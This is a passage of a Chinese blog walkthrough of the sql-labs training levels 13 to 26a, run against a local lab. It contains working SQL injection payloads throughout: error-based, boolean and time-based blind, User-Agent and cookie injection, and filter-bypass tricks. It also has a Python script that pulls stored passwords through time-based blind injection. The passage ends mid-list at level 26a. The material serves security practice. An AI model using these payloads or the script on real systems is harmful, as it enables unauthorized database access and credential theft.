+<p>因为原式语句里带了双引号，你只有测试<code>?id=1&quot;</code>或者?id=1”)这类带双引号的语句才会报错【双引号不匹配】，输入类似<code>?id=1&#39;</code>的语句不会报错【’在“”包裹下只会被当成普通的字符，相当于请求一个username为admin’的用户，不会成功】</p>
+</blockquote>
+<h2 id="No-13"><a href="#No-13" class="headerlink" title="No.13"></a>No.13</h2><p>先测试注入点，发现注入点是<code>?uname=admin&#39;)#</code></p>
+<p>然后就开始像前两关一样注入，可是发现没有任何回显，那么就想到用No.5的报错型注入，就像：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;xxx&#39;) union select count(*),concat((select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 0,1),floor(rand(0)*2))x from information_schema.schemata group by x #&amp;passwd&#x3D;admin</span><br><span class="line">或者</span><br><span class="line">uname&#x3D;xxx&#39;) and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 0,1),0x7e),1)#&amp;passwd&#x3D;admin</span><br><span class="line">或者</span><br><span class="line">uname&#x3D;xxx&#39;) and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 0,1),0x7e))#&amp;passwd&#x3D;admin</span><br></pre></td></tr></table></figure>
+
+<p>就可以注入成功</p>
+<h2 id="No-14"><a href="#No-14" class="headerlink" title="No.14"></a>No.14</h2><p>也没啥，就是注入点变成了<code>?uname=xxx&quot;</code></p>
+<h2 id="No-15"><a href="#No-15" class="headerlink" title="No.15"></a>No.15</h2><p>测试了一下这关不回显也不报错，只能用时间注入或者布尔注入</p>
+<p>布尔注入测试：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#x2F;*测试符号*&#x2F; and 1&#x3D;1 #&amp;passwd&#x3D;xxx			&#x2F;&#x2F;成功</span><br><span class="line">uname&#x3D;admin&#x2F;*测试符号*&#x2F; and 1&#x3D;2 #&amp;passwd&#x3D;xxx			&#x2F;&#x2F;失败</span><br></pre></td></tr></table></figure>
+
+<p>布尔注入测试：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#x2F;*测试符号*&#x2F; and sleep(2) #&amp;passwd&#x3D;xxx</span><br></pre></td></tr></table></figure>
+
+<p>最后测得注入点是单引号。</p>
+<p>于是可以构造布尔注入：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39; and ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),1,1))&gt;100#&amp;passwd&#x3D;xxx</span><br></pre></td></tr></table></figure>
+
+<p>当然也可以构造时间注入：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&#39; and if((ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),1,1))&gt;101),1,sleep(2))#&amp;passwd&#x3D;xxx</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="遗留疑惑1"><a href="#遗留疑惑1" class="headerlink" title="遗留疑惑1"></a>遗留疑惑1</h3><ol>
+<li><p>布尔注入时，写脚本时候，requests.text返回成功页面和失败页面没有区别。</p>
+</li>
+<li><p>现在发现，好像是post数据通过python脚本传不过去。。。很迷，自己测试的本地post都成功</p>
+</li>
+<li><p>我简直要吐了。调试了那么多东西，改了将近一天时间，你们知道错误出在哪吗？？？！！！错误出在：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;localhost&#x2F;Sql-labs&#x2F;Less-15&#39;</span><br><span class="line">这玩意我少加了&#x2F;</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;localhost&#x2F;Sql-labs&#x2F;Less-15&#x2F;&#39;</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+<p>所以布尔注入的脚本就是这样：[不行了气死我了]</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">## by Albatross</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://localhost/Sql-labs/Less-15/'</span></span><br><span class="line">res = <span class="string">""</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">	print(<span class="string">"password"</span> +str(i)+<span class="string">":"</span>)</span><br><span class="line">	flag = <span class="number">1</span></span><br><span class="line">	res = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">		<span class="keyword">if</span>(flag==<span class="number">0</span>):</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">			uname = <span class="string">"admin' and if((ascii(substring((select password from security.users limit "</span> +str(i)+ <span class="string">",1),"</span> +str(j)+ <span class="string">",1))&gt;"</span> +str(k)+ <span class="string">"),1,sleep(2))#"</span></span><br><span class="line">			passwd = <span class="string">"xxx"</span></span><br><span class="line">			data1 = &#123;<span class="string">"uname"</span>:uname,<span class="string">"passwd"</span>:passwd,<span class="string">"submit"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line">			time1 = time.time()</span><br><span class="line">			r = requests.post(url,data=data1)</span><br><span class="line">			time2 = time.time()</span><br><span class="line">			use = time2 - time1</span><br><span class="line">			<span class="keyword">if</span>(use&gt;<span class="number">2</span>):</span><br><span class="line">				<span class="keyword">if</span>(k==<span class="number">32</span>):</span><br><span class="line">					flag=<span class="number">0</span></span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">				<span class="keyword">else</span>:</span><br><span class="line">					res += chr(k)</span><br><span class="line">					print(res)</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line">					</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="No-16"><a href="#No-16" class="headerlink" title="No.16"></a>No.16</h2><p>和上一关区别不大，只是注入点变成了<code>?uname=admin&quot;)</code></p>
+<h2 id="No-17【UPDATE修改密码】"><a href="#No-17【UPDATE修改密码】" class="headerlink" title="No.17【UPDATE修改密码】"></a>No.17【UPDATE修改密码】</h2><p>这一关就比较不一样了，这是一个修改密码的页面，而且发现无论对uname做什么操作，都会得到：</p>
+<p><img src="/2020/09/26/sql-labs/17_1.png" alt="17_1"></p>
+<p>查看源代码发现uname数据要经过下面这个函数的过滤：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span><span class="params">($con, $value)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">// truncation (see comments)</span></span><br><span class="line">		$value = substr($value,<span class="number">0</span>,<span class="number">15</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">		<span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">			&#123;</span><br><span class="line">			$value = stripslashes($value);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Quote if not a number</span></span><br><span class="line">		<span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">			&#123;</span><br><span class="line">			$value = <span class="string">"'"</span> . mysqli_real_escape_string($con, $value) . <span class="string">"'"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">		$value = intval($value);</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> $value;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>addslashes() 函数，这是个什么东西呢？<br> addslashes()函数：一个会在预定义字符之前添加反斜杠的函数，即会帮助转义</p>
+<p>预定义字符有：</p>
+<ul>
+<li>单引号(’)</li>
+<li>双引号(“)</li>
+<li>反斜杠()</li>
+<li>NULL</li>
+</ul>
+<p>所以在平时过程中，咱就不用手动加转义字符了，但怕有些人进行了双层转义，所以可以使用 get_magic_quotes_gpc() 来进行检测，其参数为 string，string类型，内容为规定要转义的字符串，该函数返回内容为已转义的字符串，该函数适用于 PHP 版本 4.0+</p>
+<p>第三个要介绍的就是 stripslashes() 函数，该函数可以删除 addslashes() 函数添加的反斜杠</p>
+<p>最后就是 mysql_real_escape_string() 函数：<br> 它将转义 SQL 语句中使用的字符串中的特殊字符</p>
+</blockquote>
+<p>那么我们想到能不能对passwd这个参数做一些注入。</p>
+<p>我们知道，修改密码用到的是UPDATE，类似于：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE users SET password &#x3D; &#39;$passwd&#39; WHERE username&#x3D;&#39;$row1&#39;</span><br></pre></td></tr></table></figure>
+
+<p>那么，我们的union就不再管用了：</p>
+<p><img src="/2020/09/26/sql-labs/17_2.png" alt="17_2"></p>
+<p>那就想到是否可以报错型注入：</p>
+<p><img src="/2020/09/26/sql-labs/17_3.png" alt="17_3"></p>
+<p>但是用floor注入的时候就遇到了一些问题：</p>
+<p><img src="/2020/09/26/sql-labs/17_4.png" alt="17_4"></p>
+<ol>
+<li><p>首先用and不可以，会报错：Truncated incorrect DOUBLE value: ‘Dick’【后来发现把Dick这种字母改成数字就完全没有问题了】</p>
+</li>
+<li><p>其次select的数字必须是一列，可能是因为update本身就修改一列的数据。这样就屏蔽了另外一种floor报错【不用别名而要请求多列的】</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">update sql_4 SET name&#x3D;&#39;Dick&#39; where (select 1,count(*),concat((select database()),floor(rand(0)*2))x from information_schema.schemata group by x);</span><br></pre></td></tr></table></figure>
+
+<p>因为count(*)和concat的内容最少也需要两列</p>
+</li>
+</ol>
+<h3 id="有趣的发现3"><a href="#有趣的发现3" class="headerlink" title="有趣的发现3"></a>有趣的发现3</h3><blockquote>
+<p><img src="/2020/09/26/sql-labs/17_6.png" alt="17_6"></p>
+<p>这里用数字就可以，用字母就不可以，我也不晓得为什么</p>
+</blockquote>
+<h3 id="遗留疑惑2【见有趣的发现3】"><a href="#遗留疑惑2【见有趣的发现3】" class="headerlink" title="遗留疑惑2【见有趣的发现3】"></a>遗留疑惑2【见有趣的发现3】</h3><p>于是我们就可以开始构造payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;),0x7e),1) #</span><br><span class="line">或者</span><br><span class="line">uname&#x3D;admin&amp;passwd&#x3D;1&#39; and (select 1 from (select count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;),floor(rand(0)*2))x from information_schema.schemata group by x)a)#</span><br></pre></td></tr></table></figure>
+
+<p>但是当我们构造</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;1&#39; and updatexml(1,concat(0x7e,(select group_concat(password) from security.users),0x7e),1) #</span><br></pre></td></tr></table></figure>
+
+<p>会报错：</p>
+<p><img src="/2020/09/26/sql-labs/17_7.png" alt="17_7"></p>
+<p>测试里同样出现了这种问题：【后来发现只是我前面做update题时把他全改成xxx了，不是加密。。。想多了】</p>
+<p><img src="/2020/09/26/sql-labs/17_8.png" alt="17_8"></p>
+<p>我们试着多构造一层【记得取别名！！！】</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uname&#x3D;admin&amp;passwd&#x3D;1&#39; and updatexml(1,concat(0x7e,(select username from (select username from users limit 0,1)a),0x7e),1) #</span><br><span class="line">或者</span><br><span class="line">uname&#x3D;admin&amp;passwd&#x3D;1&#39; and (select 1 from (select count(*),concat((select username from (select username from users limit 0,1)a),floor(rand(0)*2))x from information_schema.schemata group by x)a)#</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="遗留疑惑3"><a href="#遗留疑惑3" class="headerlink" title="遗留疑惑3"></a>遗留疑惑3</h3><blockquote>
+<p><img src="/2020/09/26/sql-labs/17_9.png" alt="17_9"></p>
+<p>当多构造的一层和里面一层select的对象不同的时候，会这样报错：Only constant XPATH queries are supported</p>
+</blockquote>
+<h2 id="No-18【http头uagent注入】"><a href="#No-18【http头uagent注入】" class="headerlink" title="No.18【http头uagent注入】"></a>No.18【http头uagent注入】</h2><p>这一关就和之前完全不一样了，首先看一下源代码，发现：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$uname &#x3D; check_input($con, $_POST[&#39;uname&#39;]);</span><br><span class="line">$passwd &#x3D; check_input($con, $_POST[&#39;passwd&#39;]);</span><br></pre></td></tr></table></figure>
+
+<p>我们不可能从用户名和密码这个注入点注入了，所以继续观察发现：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$uagent &#x3D; $_SERVER[&#39;HTTP_USER_AGENT&#39;];</span><br><span class="line">$IP &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line"></span><br><span class="line">$insert&#x3D;&quot;INSERT INTO &#96;security&#96;.&#96;uagents&#96; (&#96;uagent&#96;, &#96;ip_address&#96;, &#96;username&#96;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)&quot;;</span><br><span class="line"></span><br><span class="line">echo &#39;Your User Agent is: &#39; .$uagent;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/26/sql-labs/18_1.png" alt="18_1"></p>
+<p>我们用bp抓一个包试试看：</p>
+<p><img src="/2020/09/26/sql-labs/18_2.png" alt="18_2"></p>
+<p>我们发现，这两个东西是一样，也就是insert里的uagent，我们就想到把这个地方当作一个注入点。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSERT INTO &#96;security&#96;.&#96;uagents&#96; (&#96;uagent&#96;, &#96;ip_address&#96;, &#96;username&#96;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;, $uname)</span><br><span class="line">我们把uagent的值设为：1&#39;,1,1)#，这句就变成了：</span><br><span class="line">INSERT INTO &#96;security&#96;.&#96;uagents&#96; (&#96;uagent&#96;, &#96;ip_address&#96;, &#96;username&#96;) VALUES (&#39;1&#39;,1,1)#</span><br><span class="line">这里就是我们的注入点</span><br></pre></td></tr></table></figure>
+
+<p>我们可以构造爆库</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-Agent：1&#39;,1,updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br></pre></td></tr></table></figure>
+
+<p>爆表：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-Agent：1&#39;,1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;),0x7e),1))#</span><br></pre></td></tr></table></figure>
+
+<p>爆字段：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-Agent：1&#39;,1,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39;),0x7e),1))#</span><br></pre></td></tr></table></figure>
+
+<p>爆值：[变换n的值来爆不同的值]</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">User-Agent：1&#39;,1,updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from security.users limit n,1),0x7e),1))#</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="No-19【http头referer注入】"><a href="#No-19【http头referer注入】" class="headerlink" title="No.19【http头referer注入】"></a>No.19【http头referer注入】</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$uagent &#x3D; $_SERVER[&#39;HTTP_REFERER&#39;];</span><br><span class="line">$IP &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];</span><br><span class="line"></span><br><span class="line">$insert&#x3D;&quot;INSERT INTO &#96;security&#96;.&#96;referers&#96; (&#96;referer&#96;, &#96;ip_address&#96;) VALUES (&#39;$uagent&#39;, &#39;$IP&#39;)&quot;;</span><br><span class="line"></span><br><span class="line">echo &#39;Your Referer is: &#39; .$uagent;</span><br></pre></td></tr></table></figure>
+
+<p><code>$uagent = $_SERVER[&#39;HTTP_REFERER&#39;];</code>这个就代表http头里的referer字段</p>
+<h3 id="遗留疑惑3-1"><a href="#遗留疑惑3-1" class="headerlink" title="遗留疑惑3"></a>遗留疑惑3</h3><blockquote>
+<p>这个按道理说应该是按照18关的方法，改到referer上面就可以了，网上也都是这么说的，可是本地sqllabs似乎有点问题，一直没有回显，这道题就先放着。</p>
+<p><img src="/2020/09/26/sql-labs/19_1.png" alt="19_1"></p>
+</blockquote>
+<h2 id="No-20【cookie注入】"><a href="#No-20【cookie注入】" class="headerlink" title="No.20【cookie注入】"></a>No.20【cookie注入】</h2><p>这一关我们直接查看源代码，发现以下关键性代码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$cookee &#x3D; $_COOKIE[&#39;uname&#39;];</span><br><span class="line"></span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE username&#x3D;&#39;$cookee&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>这样就和之前最简单的单引号注入一样了，我们直接bp改cookie：</p>
+<p><img src="/2020/09/26/sql-labs/20_1.png" alt="20_1"></p>
+<p>然后像No.1一样慢慢爆出来就行了。</p>
+<p><img src="/2020/09/26/sql-labs/20_2.png" alt="20_2"></p>
+<p>当然，布尔注入，报错注入，时间注入也都是OK的。</p>
+<h2 id="No-21【base64加密】"><a href="#No-21【base64加密】" class="headerlink" title="No.21【base64加密】"></a>No.21【base64加密】</h2><p>先正常输入用户名和密码得到：</p>
+<p><img src="/2020/09/26/sql-labs/21_1.png" alt="21_1"></p>
+<p>其中：<code>YWRtaW4=</code>解码之后是admin，然后连上bp，发现cookie确实是这个。</p>
+<p>我们就试着把注入语句通过base64加密之后放到cookie的uname里。</p>
+<p>首先admin’加密后得到：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use near &#39;&#39;admin&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br><span class="line">即</span><br><span class="line">&#39;admin&#39;&#39;) LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+<p>即可发现该注入是单引号加单括号注入。</p>
+<p>接着就像No.1那关一步步加密后，放到cookie里面即可。</p>
+<p><img src="/2020/09/26/sql-labs/21_2.png" alt="21_2"></p>
+<h2 id="No-22"><a href="#No-22" class="headerlink" title="No.22"></a>No.22</h2><p>大体上和刚才差不多。</p>
+<p>admin’发现不报错，应该就是和双引号有关的注入点，一测果然就是双引号：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use near &#39;&quot;admin&quot;&quot; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>还是base64加密之后放入cookie里就好了。</p>
+<h2 id="No-23【过滤注释符】"><a href="#No-23【过滤注释符】" class="headerlink" title="No.23【过滤注释符】"></a>No.23【过滤注释符】</h2><p>先测试出是单引号报错，但是<code>?id=1 #</code>还是报错，推测是<code>#</code>和<code>--+</code>被过滤，一看源码果然是：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;filter the comments out so as to comments should not work</span><br><span class="line">$reg &#x3D; &quot;&#x2F;#&#x2F;&quot;;</span><br><span class="line">$reg1 &#x3D; &quot;&#x2F;--&#x2F;&quot;;</span><br><span class="line">$replace &#x3D; &quot;&quot;;</span><br><span class="line">$id &#x3D; preg_replace($reg, $replace, $id);</span><br><span class="line">$id &#x3D; preg_replace($reg1, $replace, $id);</span><br><span class="line"></span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>既然我们无法注释消除后面的引号，那么我们就通过闭合它来完成：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; and &#39;1&#39;&#x3D;&#39;1</span><br><span class="line">这样这条语句就变成了：</span><br><span class="line">SELECT * FROM users WHERE id&#x3D;&#39;1&#39; and &#39;1&#39;&#x3D;&#39;1&#39; LIMIT 0,1</span><br><span class="line">&#39;1&#39;&#x3D;&#39;1&#39;是一条永真语句，所以对查询结果并无影响，要union什么就在and前面添加就行了。</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">?id&#x3D;1&#39; union select 1,2,&#39;3</span><br><span class="line">将3闭合</span><br><span class="line">SELECT * FROM users WHERE id&#x3D;&#39;1&#39; union select 1,2,&#39;3&#39; LIMIT 0,1</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><blockquote>
+<p>有一些比较低版本的MySQL可以使用%00截断，类似于</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?id&#x3D;-1&#39; union select 1,database(),3; %00</span><br></pre></td></tr></table></figure>
+
+<p>测试结果如下：</p>
+<p><img src="/2020/09/26/sql-labs/23_1.png" alt="23_1"></p>
+<p>发现%00截断了后面的内容，无论在后面加什么奇怪的字符，都相当于没有，；也不行：</p>
+<p><img src="/2020/09/26/sql-labs/23_2.png" alt="23_2"></p>
+</blockquote>
+<p>接下来就像No.1一样注入就行了,但是有一点要注意一下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,group_concat(username),group_concat(password) from security.users and &#39;1&#39; &#x3D; &#39;1</span><br></pre></td></tr></table></figure>
+
+
+<p>这样好像不太行：</p>
+<p><img src="/2020/09/26/sql-labs/D:%5Cgitblog%5C1%5Csource_posts%5Csql-labs%5C23_3.png" alt="23_3"></p>
+<p>只能像这样</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,(select group_concat(password) from security.users ),3 and &#39;1&#39; &#x3D; &#39;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/09/26/sql-labs/23_4.png" alt="23_4"></p>
+<p>或者用%00截断：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,group_concat(username),group_concat(password) from security.users ;%00</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="No-24【遗留】"><a href="#No-24【遗留】" class="headerlink" title="No.24【遗留】"></a>No.24【遗留】</h2><p>这关出了点小问题，双admin都登不上去，先放一放。</p>
+<h2 id="No-25【绕and-or】"><a href="#No-25【绕and-or】" class="headerlink" title="No.25【绕and/or】"></a>No.25【绕and/or】</h2><p><img src="/2020/09/26/sql-labs/D:%5Cgitblog%5C1%5Csource_posts%5Csql-labs%5C25_1.png" alt="25_1"></p>
+<p>源代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$id= blacklist($id);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/AND/i'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>这一关过滤了所有的 and 和 or，第一眼觉得问题不大，但后来发现其他一些东西也被过滤了，比如order,information_schema里面都含有or。</p>
+<p>其实也很简单，就是一个双写绕过，比如and写成anandd，or写成oorr。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_name&#x3D;&#39;users&#39; aandnd table_schema&#x3D;&#39;security&#39;--+</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<blockquote>
+<p>本关考察对or和and的过滤，一般几个思路：</p>
+<ol>
+<li>大小写变形Or OR oR</li>
+<li>编码，hex，urlencode</li>
+<li>添加注释<code>/*or*/</code>，o/**/r</li>
+<li>and = &amp;&amp;、or = ||</li>
+<li>重复 oorr、aandnd</li>
+</ol>
+</blockquote>
+<h2 id="No-25a"><a href="#No-25a" class="headerlink" title="No.25a"></a>No.25a</h2><p>和No.25几乎一样，只是<code>?id=1&#39;</code>换成了<code>?id=1</code></p>
+<h2 id="No-26【过滤空格和常见字符】"><a href="#No-26【过滤空格和常见字符】" class="headerlink" title="No.26【过滤空格和常见字符】"></a>No.26【过滤空格和常见字符】</h2><p><img src="/2020/09/26/sql-labs/D:%5Cgitblog%5C1%5Csource_posts%5Csql-labs%5C26_1.png" alt="26_1"></p>
+<p>这波过滤了空格和一系列字符，看了源码发现是：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$id= blacklist($id);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span><span class="params">($id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	$id= preg_replace(<span class="string">'/or/i'</span>,<span class="string">""</span>, $id);			<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/and/i'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//strip out /*</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out --</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);			<span class="comment">//Strip out #</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\s]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out spaces</span></span><br><span class="line">	$id= preg_replace(<span class="string">'/[\/\\\\]/'</span>,<span class="string">""</span>, $id);		<span class="comment">//Strip out slashes【斜线】</span></span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>鉴于正常注入字符不太好调整成无过滤字符，我们这关使用报错注入：</p>
+<p>爆库</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39;anandd(updatexml(1,concat(0x7e,(database()),0x7e),1))aandnd&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+
+<p>爆表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39;anandd(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)like(&#39;security&#39;)),0x7e),1))aandnd&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+
+<p>爆字段</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39;anandd(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema)like(&#39;security&#39;)anandd(table_name)like(&#39;users&#39;)),0x7e),1))aandnd&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+
+<p>爆具体数据：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39;anandd(updatexml(1,concat(0x7e,(select(group_concat(username))from(security.users)),0x7e),1))aandnd&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+
+<p>但是发现数据出来的不全：</p>
+<p><img src="/2020/09/26/sql-labs/26_2.png" alt="26_2"></p>
+<p>这里想到用<code>limit 0,1</code>,但是发现还是有空格，那么想到加where(id=n)，所以：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39;anandd(updatexml(1,concat(0x7e,(select(group_concat(username))from(security.users)where(id&#x3D;1)),0x7e),1))aandnd&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="No-26a"><a href="#No-26a" class="headerlink" title="No.26a"></a>No.26a</h2><p>先测试注入点：</p>
+<p><code>?id=1&#39;</code>无回显，证明此题不回显语法错误</p>
+<p><code>?id=1&quot;</code>正常回显id=1用户，证明此题是单引号为主体</p>
+<blockquote>
+<p>判断小括号有几种方法：</p>
+<ol>
+<li><code>2&#39;&amp;&amp;&#39;1&#39;=&#39;1</code></li>
+</ol>
+<ul>
+<li>若查询语句为<code>where id=&#39;$id&#39;</code>，查询时是<code>where id=&#39;2&#39;&amp;&amp;&#39;1&#39;=&#39;1&#39;</code>，结果是<code>where id=&#39;2&#39;</code>，回显会是<code>id=2</code>。</li>
